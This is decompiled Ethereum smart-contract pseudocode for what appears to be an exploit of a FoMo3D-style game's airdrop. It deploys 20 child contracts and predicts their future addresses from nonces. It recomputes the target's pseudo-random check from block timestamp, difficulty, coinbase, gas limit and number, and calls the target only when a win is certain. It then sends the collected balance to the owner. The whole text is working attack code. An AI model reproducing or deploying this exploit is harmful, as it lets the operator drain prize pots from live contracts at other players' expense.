contract main {




// =====================  Runtime code  =====================


address stor0;
array of address sub_6a11455a;
array of uint8 nonces;

function nonces(uint256 arg1) {
    require arg1 < nonces.length
    return uint256(nonces[arg1])
}

function sub_6a11455a(?) {
    require arg1 < sub_6a11455a.length
    return sub_6a11455a[arg1]
}

function _fallback() payable {
    revert
}

function get() {
    call stor0 with:
       value eth.balance(this.address) wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function sub_c5263b25(?) {
    idx = 0
    while idx < 20:
        mem[96 len 577] = code.data[2007 len 577]
        create contract with 0 wei
                        code: code.data[2007 len 577]
        if not create.new_address:
            revert with ext_call.return_data[0 len return_data.size]
        sub_6a11455a.length++
        sub_6a11455a[sub_6a11455a.length] = address(create.new_address)
        nonces.length++
        mem[0] = 2
        uint256(nonces[nonces.length]) = 1
        idx = idx + 1
        continue 
}

function sub_56145ea4(?) payable {
    mem[64] = 96
    require msg.value == 10^17
    require ext_code.size(arg1)
    call arg1.airDropPot_() with:
         gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_code.size(arg1)
    call arg1.airDropTracker_() with:
         gas gas_remaining wei
    mem[96] = ext_call.return_data[0]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] > 6 * 10^17
    require ext_call.return_data[0] > 0
    idx = 0
    while idx < sub_6a11455a.length:
        require idx < nonces.length
        mem[0] = 2
        _60 = mem[64]
        mem[mem[64] + 32] = address(sha3(0, 0, sub_6a11455a[idx], uint8(nonces[idx])))
        _61 = mem[64]
        mem[mem[64]] = 20
        mem[64] = mem[64] + 52
        _63 = mem[_61]
        t = _61 + 32
        u = _60 + 52
        s = mem[_61]
        while s >= 32:
            mem[u] = mem[t]
            t = t + 32
            u = u + 32
            s = s - 32
            continue 
        mem[_60 + floor32(mem[_61]) + 52] = mem[_60 + floor32(mem[_61]) + 52] and 256^(-(mem[_61] % 32) + 32) - 1 or mem[_61 + floor32(mem[_61]) + 32] and !(256^(-(mem[_61] % 32) + 32) - 1)
        _104 = sha3(mem[_60 + 52 len _63])
        require block.timestamp
        mem[_60 + 84] = address(block.coinbase)
        mem[_60 + 52] = 20
        mem[64] = _60 + 104
        t = _60 + 84
        u = mem[64]
        s = mem[_60 + 52]
        while s >= 32:
            mem[u] = mem[t]
            t = t + 32
            u = u + 32
            s = s - 32
            continue 
        mem[mem[64] + floor32(mem[_60 + 52])] = mem[mem[64] + floor32(mem[_60 + 52])] and 256^(-(mem[_60 + 52] % 32) + 32) - 1 or mem[_60 + floor32(mem[_60 + 52]) + 84] and !(256^(-(mem[_60 + 52] % 32) + 32) - 1)
        require block.timestamp
        if block.difficulty + block.timestamp < block.timestamp:
            revert with 0, 'SafeMath add failed'
        if sha3(mem[mem[64] len _60 + -mem[64] + 124]) / block.timestamp < 0:
            revert with 0, 'SafeMath add failed'
        if block.gas_limit < 0:
            revert with 0, 'SafeMath add failed'
        if _104 / block.timestamp < 0:
            revert with 0, 'SafeMath add failed'
        if block.number < 0:
            revert with 0, 'SafeMath add failed'
        _153 = mem[64]
        mem[mem[64] + 32] = block.number + (_104 / block.timestamp) + block.gas_limit + (sha3(mem[mem[64] len _60 + -mem[64] + 124]) / block.timestamp) + block.difficulty + block.timestamp
        _154 = mem[64]
        mem[mem[64]] = 32
        mem[64] = mem[64] + 64
        _156 = mem[_154]
        t = _154 + 32
        u = mem[64]
        s = mem[_154]
        while s >= 32:
            mem[u] = mem[t]
            t = t + 32
            u = u + 32
            s = s - 32
            continue 
        mem[mem[64] + floor32(mem[_154])] = mem[mem[64] + floor32(mem[_154])] and 256^(-(mem[_154] % 32) + 32) - 1 or mem[_154 + floor32(mem[_154]) + 32] and !(256^(-(mem[_154] % 32) + 32) - 1)
        if sha3(mem[mem[64] len _153 + _156 + -mem[64] + 64]) - (1000 * sha3(mem[mem[64] len _153 + _156 + -mem[64] + 64]) / 1000) >= ext_call.return_data[0]:
            idx = idx + 1
            continue 
        require idx < sub_6a11455a.length
        require ext_code.size(sub_6a11455a[idx])
        call sub_6a11455a[idx].0x56145ea4 with:
           value msg.value wei
             gas gas_remaining wei
            args address(arg1)
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require idx < nonces.length
        uint256(nonces[idx])++
}



}
